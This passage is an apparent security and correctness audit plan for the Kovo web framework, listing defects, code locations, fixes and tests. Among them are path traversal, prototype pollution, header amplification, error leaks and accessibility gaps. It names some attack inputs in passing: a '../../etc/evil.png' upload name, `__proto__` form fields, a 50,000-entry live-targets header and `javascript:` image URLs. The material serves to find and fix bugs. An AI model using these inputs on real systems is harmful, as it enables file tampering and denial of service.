  - **Where:** `core/src/index.ts:251-257` (`PathParamNames`), `:412` (`buildHref` regex `/:([A-Za-z_$][\w$]*)/g`); compiler `lower/navigation.ts:237-272`; server `match.ts:271-284` (param name = whole segment after `:`).
  - **Defect:** the type extractor + matcher take the **whole** segment after `:` (`user-id`, `name.json`), but the URL builders stop at the first non-word char. `href('/users/:user-id', { params:{'user-id':'42'} })` type-checks yet produces `/users/-id` (value dropped); `'/files/:name.json'` → `/files/.json`. Navigation/redirect/Link/GET-form hrefs silently go to the wrong resource — the exact §6.6 type-vs-runtime divergence the soundness boundary forbids.
  - **Fix:** make all three grammars identical — builders consume the full segment after `:` up to `/`/`?`/`#`. Reconcile the speculative optional-param branch in `PathParamNames`.
  - **Test:** `href('/users/:user-id',{params:{'user-id':'42'}})==='/users/42'`; round-trip `matchRoute(...).params['user-id']==='42'`.
  - **Verified:** exploiter + refuter reproduced `/users/-id` + the `tsc` type proof.

---

## Lane I — Streaming & deferred _(`browser/src/apply-mutation-response.ts`; `server/src/deferred-stream.ts`)_

- [x] **I1 (high) — Streaming mutation ending with a non-`complete` `<kovo-done reason>` leaves already-applied query truths and fragment morphs committed; the runtime presents a partial as confirmed** `spec-impl-divergence` (L13-2)
  - **Where:** `apply-mutation-response.ts:228-322`; `mutation-apply.ts:88-117`; `error-policy.ts:8-13`.
  - **Defect:** query truths and fragment morphs apply progressively; the terminal `reason` is inspected only after the whole stream. On `reason!=='complete'` it calls `onError` (no throw) and fails the text buffer but does **not** revert the committed query/fragment state, does not throw, and returns success → a mutation that errors halfway is presented as confirmed (§9.1:810 "must not silently present a partial as confirmed"). The inline loader's `sfail()` shares the gap.
  - **Fix:** on a non-complete `kovo-done` (or interrupted stream), revert/discard the partial query/fragment state and signal failure so the caller marks the form failed and refetches; extend `sfail()` to query/fragment truth.
  - **Test:** stream `<kovo-query>` + `<kovo-fragment>` + `<kovo-done reason="error">` → function signals failure / store reverted (currently applied + success).
  - **Verified:** exploiter + refuter (sibling of part-2 "kovo-done error ignored" but that fix only covered stream-text).

> **Triaged here (medium):** `deferred-stream.ts` frames chunks with a **fixed unescaped boundary**
> (`--kovo-boundary`); fragment content containing a newline + that literal forges a chunk boundary and
> corrupts later chunks (L13-1). Fix: high-entropy per-response boundary + re-roll/assert no collision.
> Reachable via attacker text rendered into a deferred fragment. Medium (corruption, not direct RCE/leak).

---

## Lane J — headless-ui a11y & primitives _(`packages/headless-ui/src/primitives/_`)\*

- [x] **J1 (high) — `autocomplete` `aria-activedescendant` points at a wrong/nonexistent option id (unfiltered index + never synthesizes an option id)** `spec-impl-divergence` (L14-1)
  - **Where:** `autocomplete.ts:197`/`564-576` (activedescendant uses `items.findIndex` over the **unfiltered** list) + `:236-251` (`autocompleteOptionAttributes` emits an id only when the author passes one). Contrast combobox/command (part-3 J).
  - **Defect:** options render from the _filtered_ suggestions, but the activedescendant uses the full-array index and the option element has no synthesized id → the reference dangles on every arrow key → SRs never announce the highlighted suggestion.
  - **Fix:** mirror combobox — `autocompleteOptionId` (explicit id else `<listId>-option-<filteredIndex>`), emit it, and compute activedescendant over the filtered list.
  - **Test:** filtered list, highlighted item → input `aria-activedescendant` equals the rendered option's id (filtered index).
  - **Verified:** exploiter + refuter reproduced the dangling reference.

- [x] **J2 (high) — `navigation-menu` deferred focus uses bare `setTimeout(0)` instead of `scheduleDeferred` → focus no-ops while content is still hidden** `impl-bug` (L14-2)
  - **Where:** `navigation-menu.ts:556-558` (default schedule `setTimeout(cb,0)`; never imports `scheduleDeferred`); contrast dropdown-menu/menubar/context-menu which use `scheduleDeferred`.
  - **Defect:** content is un-hidden only after the runtime drains its post-commit queue (a later microtask); a bare `setTimeout(0)` fires first → `.focus()` on a still-hidden subtree is a no-op → opening a nav-menu submenu by keyboard never moves focus in.
  - **Fix:** `(options.schedule ?? scheduleDeferred)(focus)`.
  - **Test:** call `navigationMenuFocusElement(event, id, {defer:true})` without a schedule → focus routed into the post-commit queue (currently `setTimeout`).
  - **Verified:** exploiter + refuter (the existing defer test always passes an explicit schedule, never the default path).

- [x] **J3 (high) — `select` highlighted option is invisible to assistive tech: open listbox has no `aria-activedescendant` and options have no roving tabindex** `coverage-gap` (L14-3)
  - **Where:** `select.ts:155-213` (no activedescendant, no `tabIndex`, id only if explicit), `:291-479` (move/keydown mutate only `highlightedValue`). Contrast combobox/command/autocomplete.
  - **Defect:** the open-state keyboard model changes only `data-highlighted` (visual) — AT announces nothing, so a keyboard+SR user cannot perceive/operate the option list.
  - **Fix:** add `selectActiveDescendant` + synthesized option ids; emit `aria-activedescendant` on the trigger/listbox when open.
  - **Test:** open select, highlighted item → `aria-activedescendant` equals the option id (both absent today).
  - **Verified:** exploiter + refuter.

- [x] **J4 (high) — `number-field` increment/decrement sticks and emits off-grid float values for fractional steps (e.g. `step=0.1`)** `impl-bug` (J-numberfield)
  - **Where:** `number-field.ts:380-399` (`numberFieldAlignedStepValue` uses `Number.isInteger((value-min)/step)`).
  - **Defect:** IEEE-754 error makes an on-grid value read off-grid; incrementing from `0.6` yields `0.6000000000000001` (offset `5.999…` → `Math.ceil`=6) — the spinner stutters at ~0.6 instead of reaching 0.7 and commits a noisy off-grid value, disagreeing with the native `<input step=0.1>`.
  - **Fix:** round the offset before the integer test and snap the result to step precision (mirror `slider.ts roundSliderValue`).
  - **Test:** increment from 0 eight times with `step:0.1` → `[0.1..0.8]` (currently includes `0.6000000000000001`, never cleanly 0.7).
  - **Verified:** exploiter + refuter reproduced the stuck/off-grid path.

- [x] **J5 (high, promoted) — Base `Dialog` content omits `aria-modal="true"` — AT reads the background page (divergence from its two sibling modal primitives)** `spec-impl-divergence` (OFM-1)
  - **Where:** `dialog.ts:83-94` (no `aria-modal`/`role`); `alert-dialog.ts:98-107` and `command` both emit `aria-modal:'true'`.
  - **Defect:** the most-used overlay (cart drawer, modal forms) doesn't tell AT the rest of the page is inert, so screen readers wander the background while the modal is open.
  - **Fix:** emit `aria-modal:'true'` (and `role:'dialog'`) from `dialogContentAttributes`.
  - **Test:** `dialogContentAttributes` includes `aria-modal:'true'`.
  - **Verified:** exploiter confirmed; refuter weaker (a sibling-parity nuance, not a refutation).

> **Triaged here (medium, OFM-2):** `Dialog`/`AlertDialog` reflect a bare `open` attribute — a state-driven /
> SSR-open render produces a **non-modal** `<dialog>` (no focus trap, no inert background, no top-layer), since
> native modality requires `showModal()`. Fix: don't reflect bare `open`; route opens through `showModal()`.

---

## Lane K — Node adapter, resource exhaustion & DoS _(`server/src/{node,mutation-wire,mutation,replay}.ts`)_

- [x] **K1 (high) — Client-abort bridge leaks one socket `'close'` listener + AbortController per request on keep-alive connections** `impl-bug` (L16-1)
  - **Where:** `node.ts:72-91` (`nodeRequest.socket?.once('close', abort)` per request, never removed).
  - **Defect:** the part-3 disconnect bridge adds a socket `'close'` listener every request; on a persistent connection the same socket is reused, so each request permanently retains an AbortController + closure (over its Request). Reproduced: listener count grows monotonically and Node emits `MaxListenersExceededWarning` at 11. One cheap keep-alive connection issuing thousands of GETs is an unbounded attacker-controlled memory/listener leak.
  - **Fix:** remove all three listeners on request/response completion (`nodeResponse.once('close', cleanup)` → `off('aborted'/'close', abort)` + `socket.off('close', abort)`), or drive abort solely off the self-cleaning `nodeRequest` events.
  - **Test:** 12 sequential keep-alive GETs on one socket → `socket.listenerCount('close')` stays bounded (currently ~12), no warning.
  - **Verified:** exploiter + refuter reproduced the monotonic growth.

- [x] **K2 (high) — Client-supplied `Kovo-Live-Targets` header has no count cap: one mutation amplifies into N component renders + O(N·M) selection** `impl-bug` (L17-1)
  - **Where:** `mutation-wire.ts:272-373` (parse, no cap; dedupe by `.target` only); `mutation.ts:1819-1887` (`selectMutationResponseTargets` O(N·M)); `:1748-1792` (`renderLiveTargetChunks` one render per descriptor).
  - **Defect:** an authenticated client sends `Kovo-Live-Targets: t1#CartBadge:{};…;t50000#CartBadge:{}` (distinct targets, one valid component) + a large `Kovo-Targets` → ~50000 component/query renders and an O(N·M) selection for a single request (>1000× amplification).
  - **Fix:** cap parsed live-target/descriptor counts at parse time (e.g. 64) and bound the rendered count; replace the O(N·M) scans with a Map (O(N+M)).
  - **Test:** 10_000-descriptor request → render count capped, selection not multiplicative.
  - **Verified:** exploiter + refuter reproduced the uncapped amplification.

- [x] **K3 (high) — `createMemoryMutationReplayStore.set()` evicts an in-flight pending reservation without resolving it, hanging any awaiter forever** `impl-bug` (L17-3)
  - **Where:** `replay.ts:190-210` (`set()` eviction deletes the oldest record even when pending, resolving only the same-key overwrite at `:209`); awaiter at `:118-121`.
  - **Defect:** part-2 A6 stopped `reserve()` from evicting pending, but `set()`'s `maxEntries` eviction still deletes the oldest — which may be a pending reservation — without settling its promise. A concurrent duplicate that joined via `get()` hangs forever (held connection + heap). Reachable when a store mixes `reserve()` (mutation/no-JS) and `set()` (webhook fallback) under pressure.
  - **Fix:** in `set()`'s eviction, never silently drop a pending record — skip it (like A6) or reject its promise (`MutationReplayAbortedError`) so awaiters fall back to running.
  - **Test:** `maxEntries:1`, reserve A + await `get(A)`, `set(B)` → the awaiter settles (currently hangs).
  - **Verified:** exploiter + refuter reproduced the strand.

---

## Lane L — Error disclosure & value round-trip _(`server/src/{schema,webhook,query,mutation,wire-html}.ts`)_

- [x] **L1 (high) — Non-validation errors thrown inside `s.object` field schemas (e.g. `s.file().store()` storage failures) leak their raw `.message` to the client through the typed 422** `spec-impl-divergence` (L18-1)
  - **Where:** `schema.ts:400-411` (`validationErrorFrom` wraps any field-schema throw into a `SchemaValidationError`), `:332-347` (`StoredFileSchemaImpl.parseAsync` → `storage.put` can reject); surfaced via `mutation.ts:1519-1546`/`2027-2033`.
  - **Defect:** an S3/DB exception inside a field schema is converted to a validation issue, so `parseMutationInput`'s `isSchemaValidationError` guard (meant to re-throw internals into the sanitized 500) is bypassed → the raw S3 error (bucket/endpoint/request-id) is rendered to the client. §9.2:876 "unexpected failures must not leak internals."
  - **Fix:** `validationErrorFrom` must re-throw non-`SchemaValidationError` exceptions unchanged (only re-wrap when already a validation error, to add the path).
  - **Test:** field schema throws `'SECRET endpoint …'` on valid input → response is 500 `SERVER_ERROR` (no secret), not a 422 carrying it.
  - **Verified:** exploiter + refuter reproduced the leak via `s.file().store()`.

- [x] **L2 (high) — Webhook input parsing returns the raw `.message` of ANY thrown error (incl. internal storage/DB exceptions) to the caller in the 422 body** `spec-impl-divergence` (L18-2)
  - **Where:** `webhook.ts:434-447` (`parseLooseWebhookInput` catch-all → `error.message`), `:267-280` (into the 422 payload).
  - **Defect:** a webhook input schema with `s.file().store()`/DB coercion that throws on a degraded backend ships the internal error string (DSN, table names) to the caller in a 422. Should map to the sanitized 500 the handler-exception path already returns.
  - **Fix:** only treat `isSchemaValidationError` as a 422 (emit typed issues, not `.message`); re-throw others to the outer 500.
  - **Test:** field `.parse` throws `'DB dsn postgres://…'` on a verified body → 500 (or 422 without the DSN).
  - **Verified:** exploiter + refuter reproduced.

- [x] **L3 (high) — A `bigint` column in a query result throws in `JSON.stringify` and 500s the entire `/_q` read — and the throw escapes the success path, dropping the mandated private cache headers** `impl-bug` (WVR-2)
  - **Where:** `query.ts:375-391` (success render OUTSIDE the try/catch that wraps only `runQuery` at `:329-350`); `wire-html.ts:54` (`JSON.stringify(options.value)`).
  - **Defect:** Drizzle `bigint` columns arrive as JS `bigint`; `JSON.stringify` throws → the success render rejects, the §9.4 `private, no-store` + `Vary: Cookie` + `Kovo-Build` posture is never emitted, and the endpoint 500s for every user.
  - **Fix:** wrap the success render in the same private-header try/catch; normalize bigint→string at the encode seam (or a compile-time JsonValue guard — see L5).
  - **Test:** query resolving `{count:10n}` → resolves 500 with `Cache-Control: private, no-store` (currently rejects), or 200 with serialized value.
  - **Verified:** exploiter + refuter reproduced the throw/header loss.

- [x] **L4 (high, promoted) — A `bigint`/unserializable value in a re-run mutation truth turns a COMMITTED write into a 500 → optimistic rollback of data that actually persisted (read-your-writes violation)** `impl-bug` (WVR-3)
  - **Where:** `mutation.ts:1671`/`1683-1688` (`renderQueryRerunChunk` → `JSON.stringify`), `:830-846` (render throw → 500, committed to replay).
  - **Defect:** COMMIT happens before the re-run render; a bigint in a re-run query value throws → the request becomes a 500 (cached in the replay reservation) → the client rolls back the optimistic prediction even though the write persisted. The user sees their change vanish though it's in the DB.
  - **Fix:** normalize unserializable values before `JSON.stringify` (or the L5 compile-time guard); a render throw on a committed write must not present as a failed mutation.
  - **Test:** mutation whose re-run query value contains `10n` → response is not a 500 that rolls back the committed write.
  - **Verified:** exploiter confirmed; refuter weaker.

- [x] **L5 (high, promoted) — `Date` columns silently transit as ISO strings while the inferred query/transform type stays `Date` — unsound, silent round-trip break** `spec-impl-divergence` (WVR-1)
  - **Where:** `wire-html.ts:54`/`73` + `document-core.ts:425` (`JSON.stringify` → `Date.toJSON` ISO string); `browser/src/json.ts:7` (`JSON.parse`, no reviver); optimistic transforms typed `Date`.
  - **Defect:** a `timestamp`/`date` column infers a `Date` field (§10.2:1018) but ships as a string and is parsed as a string; any `.getTime()`/date method in a binding/derive/optimistic transform throws or misbehaves — the typed surface lies about the runtime value.
  - **Fix:** a compile-time diagnostic rejecting a non-`JsonValue` result column (Date/Map/class) unless an `s.*` output schema coerces it, OR a canonical Date codec (wire marker + reviver) end-to-end.
  - **Test:** a query result `Date` field → either a compile diagnostic or a value that round-trips as a `Date` on the client.
  - **Verified:** exploiter confirmed; refuter weaker.

---

## Lane M — Storage, schema-parse & build _(`server/src/schema.ts`, `neutral-build.ts`; `core/src/storage.ts`)_

- [x] **M1 (critical) — `s.array(s.file().store())` silently never stores uploads and bypasses key normalization (data loss + traversal-key passthrough)** `impl-bug` (FS-1)
  - **Where:** `schema.ts:80-94` (`s.array` has only `parse`, no `parseAsync`), `:308-330` (`StoredFileSchemaImpl.parse` fabricates a `StoredFileUpload` without `storage.put`/`normalizeStorageKey`), `:428-430` (`parseSchemaAsync` falls back to sync `parse` when `parseAsync` absent).
  - **Defect:** the canonical multi-file pattern `s.object({ photos: s.array(s.file().store({…})) })` parses through the **sync** path (s.array exposes no `parseAsync`), which never calls `storage.put` and never `normalizeStorageKey`: (1) **none of the files are written** yet the handler gets `StoredFileUpload[]` with keys/size that look stored → DB rows point at objects that 404; (2) the attacker-controlled key from `file.name` (`'../../etc/evil.png'`) is returned **unvalidated** (traversal/null-byte/reserved-suffix checks skipped); (3) single-file vs array-file diverge in stored metadata.
  - **Fix:** give `s.array` a `parseAsync` that maps items through `parseSchemaAsync` (mirror `s.object`), and make `StoredFileSchemaImpl.parse` refuse the sync path (throw "storing requires async parsing") instead of fabricating a result.
  - **Test:** `s.array(s.file().store({…}))` with two files (one `../../etc/evil.png`) → `storage.put` called once per file (currently 0) and the traversal key rejected.
  - **Verified:** exploiter + refuter + skeptic reproduced `putCalls:0` + the traversal key passthrough.

- [x] **M2 (high) — Neutral build merges stale + duplicated CSS into emitted stylesheets across rebuilds into the same output dir** `impl-bug` (L12-1)
  - **Where:** `neutral-build.ts:339-356` (`materializeNeutralStylesheetAssets` reads the prior build's stylesheet and merges via `dedupeCssChunks`), `:433-454`; no clean step; cli builds into `dist/.kovo` with no `rm`.
  - **Defect:** it folds the previous on-disk stylesheet back into the new build and dedupes by whole-string equality, so a prior `"A\nB"` + current `["A"]` → `"A\nA\nB"`: stale chunk B is still shipped and A is duplicated. The §14 retention design _requires_ reusing the output dir across redeploys, so the 2nd+ production build reliably ships stale/duplicated CSS.
  - **Fix:** don't fold the prior emitted stylesheet back in — compute each asset's content purely from current build inputs and overwrite deterministically (capture the Vite-emitted CSS in-memory within the same build).
  - **Test:** write `"A\nB\n"`, run `materializeNeutralStylesheetAssets` with `["A"]` → result `"A\n"` (currently `"A\nA\nB\n"`).
  - **Verified:** exploiter + refuter reproduced the doubling + stale retention.

> **Triaged here (medium, SCHEMA-2):** a FormData field named `__proto__` triggers the `__proto__` setter in
> `appendRecordValue` (`schema.ts:444-454`), rebinding the parse record's prototype to an attacker array and
> dropping the field value (per-request prototype pollution; not global). Fix: build the record with
> `Object.create(null)` + `Object.hasOwn` gating (also fixes SCHEMA-1 prototype-chain reads).

---

## Contested — needs adjudication _(real per one verifier; the other dissented or down-scoped)_

Strong promote candidates (exploiter-confirmed) already pulled into the lanes: J5 (OFM-1), L4 (WVR-3), L5
(WVR-1). The rest, grouped:

**Wire-parser robustness (`browser/src/wire-response-scanner.ts`, `inline-loader.ts`)** — all real mechanisms, severity debated:

- [ ] **L7-1 (low)** — nested-mode `kovo-fragment` depth counter is corrupted by an unbalanced `<kovo-fragment>`/`</kovo-fragment>` literal inside fragment raw-HTML content → silent truncation + later chunks dropped. _exp=confirmed._ Fix: quote/structure-aware boundary detection.
- [ ] **L7-2 (medium)** — `kovo-query`/`kovo-text` chunks are scanned flat across the whole body, so a `<kovo-query>` literal embedded in a fragment's raw HTML is decoded and applied to the store (client-state poisoning). Fix: scan queries/texts only at top level (exclude fragment interiors).
- [ ] **L7-3 (low)** — an unterminated quote in a `kovo-query` opening tag makes `tagClose` consume to EOF → the whole query decode loop breaks, dropping all queries. Fix: advance past the malformed start, don't break.

**Query-runtime ordering:**

- [x] **L8-2 (low)** — visible-return / delta-miss refetch writes server truth via `store.set`, bypassing the rebaser (drops pending predictions / reverts concurrent updates). Sibling of F4/F5; fix by threading the rebaser hook into all refetch paths.
- [ ] **L8-3 (low)** — no recency/version guard on `store.set`: an out-of-order in-flight refetch overwrites fresher mutation-response truth (stale-wins). _exp=confirmed._ Fix: monotonic per-key version on writes.

**Streaming / dispatch:**

- [x] **L10-1 (medium)** — a streaming mutation generator that throws mid-stream never calls `onError` and emits no failure terminator (`mutation.ts:990` only `controller.error`). _refuter=confirmed._ Fix: thread `onError` + emit a `<kovo-done reason>`.
- [x] **L13-3 (low)** — streaming apply ignores an aborted signal mid-stream: query/fragment chunks keep committing and the reader is never cancelled. Fix: check `signal.aborted` each loop, `reader.cancel()`.

**Incremental cache:**

- [ ] **L15-1 (medium)** — cross-module stale HIT: a `registryFacts` field that was ABSENT when a module compiled is never tracked as a dependency, so its later appearance (a mutation added elsewhere) doesn't invalidate the dependent module → stale emitted output. _refuter=confirmed._ Fix: record absent-read dependencies for every consulted field.
- [ ] **L15-2 (low)** — invalidation/HMR-impact decisions gated by a 32-bit FNV-1a fact hash; a collision suppresses a needed invalidation/full-reload. Fix: sha256-backed digest (matches the part-3 L8-2 cache-key fix).

**Node shell / resource:**

- [x] **L16-2 (medium)** — Early Hints (103) sent to HTTP/1.0 clients by default (RFC 8297 violation → response desync for 1xx-unaware peers). Fix: gate `writeEarlyHints` on `httpVersion !== '1.0'`.
- [ ] **L17-2 (medium)** — per-island `AbortController` map leaks for appended/rotated islands that are never morph-removed (infinite-scroll / deferred-append). _refuter=confirmed._ Fix: prune controllers for island identities no longer in the live DOM.

**Numeric precision (siblings of C5/C6):**

- [ ] **L2-numeric-2 (medium)** — `asNumber()` float64 coercion of bigint/decimal columns produces a precision-lossy optimistic prediction that reconciles to a different exact value. _refuter=confirmed._ Fix: carry a per-column exactness flag → punt exact-numeric columns.
- [ ] **L2-numeric-3 (medium)** — `asNumber(non-numeric string)` → `NaN` propagates into SUM/inc (renders "NaN", serializes to `null`) and into ordered-insert position compare (`> NaN` always false → row always appended). Fix: punt/abort the prediction on NaN coercion.

**Prototype pollution / schema parse (siblings of M2's SCHEMA-2):**

- [x] **L2-protopollution-1 (medium)** — `applyQueryDelta` `__proto__` field name replaces the value object's prototype and drops the field (data corruption + prototype-injection) instead of wholesale-replacing. _all three verifiers weaker_ (per-object, not global). Fix: `Object.defineProperty` for delta `set` assignments.
- [x] **SCHEMA-1 (medium)** — `appendRecordValue` reads `record[key]` through the prototype chain, so FormData keys named after `Object.prototype` members (`constructor`, `toString`, …) become `[<fn>, value]` arrays (type confusion). Fix: `Object.create(null)` + `Object.hasOwn`.

**Overlay focus / meta:**

- [ ] **OFM-2 (medium)** — `Dialog`/`AlertDialog` reflect a bare `open` attribute → state-driven/SSR-open renders a non-modal `<dialog>` (no focus trap/inert/top-layer). _exp=confirmed._ (Triaged under Lane J.)
- [x] **L-i18n-meta-1 (medium)** — `og:image` meta is HTML-escaped but **not** URL-scheme-checked, so a `metaFromQuery` derive can emit `javascript:`/off-origin image URLs, bypassing the §4.8 URL allowlist. _refuter=confirmed._ Fix: route through `safeUrlAttribute`.

---

## Sequencing & ownership _(CLAUDE.md worktree protocol; ≤5 sub-agents at once)_

Most lanes are file-partitioned. Hotspots:

- **`drizzle/src/static.ts`** — D1 (CTE write receiver) + D2 (cascade closure) + C3/C4 (aggregate classification) are one owner; D1 first (it also un-blinds KV414).
- **`drizzle/src/derive.ts` + `derive-codegen.ts` + `core/src/derivation.ts`** — C1/C2 (filtered membership), C5/C6 + L2-numeric-2/3 (numeric coercion) are the same algebra; do the codegen↔interpreter numeric parity (C5/C6) and the exactness punt together so both lowerings agree.
- **`compiler/src/security/output-context.ts` + `lower/structural-jsx.ts`** — A3 (spread sinks) + B1/B2 (rawtext element text) are the same missing validation pass; one owner.
- **`browser/src/{optimism,mutation-optimistic,query-apply}.ts`** — F1–F4 + L8-2/L8-3 are the rebaser/interpose; F1 (delta-merge) is the keystone, do it first.
- **`packages/test/src/verifier-sql.ts`** — E1/E2/E3 are one owner (the SQL op extractor); E1's unconditional count-net is the structural fix.
- **`server/src/schema.ts`** — L1 (`validationErrorFrom` re-throw) + M1 (`s.array` async + sync-store refusal) + SCHEMA-1/SCHEMA-2 (`Object.create(null)`) are one owner.
- **`server/src/app-document.ts` + `guards.ts`** — G1 (no-store on cookie emission) builds directly on part-3's I2 wiring; small, do early.
- **`api-surface-baseline.json`** — A1/A2 (no surface), but H1 (`buildHref`), J primitives (new attrs/ids), and any new diagnostic codes (A3/B1/B2 may reuse KV236; E\* are test-only) → regenerate + re-gate per `rules/api-surface.md`.

## Governance & proof

- **Definition of done per item:** the cited test goes **red against today's code, green after the fix**.
  Tests that _codify_ a bug must be inverted: `guards.test.ts:366` (no-JS CSRF order), the autocomplete/select
  snapshots, `query-visible-return-refetch.test.ts:271` / `query-refetch.test.ts:128` (wrong `/_q` URL).
- Cite the relevant `SPEC.md` section per change; `SPEC.md` stays normative. Compiler/diagnostic changes
  (A1–A3, B1/B2) follow `rules/compiler-hard-rules.md`; public-surface changes (H1) follow
  `rules/api-surface.md`; a11y claims (J\*) follow `rules/accessibility-conformance.md`.
- Every finding above was confirmed by an independent exploiter **and** refuter; every **critical** also by a
  third skeptic. The three headline criticals (F1 optimistic delta, E1 harness, D1 CTE) were each confirmed by
  all three verifiers.
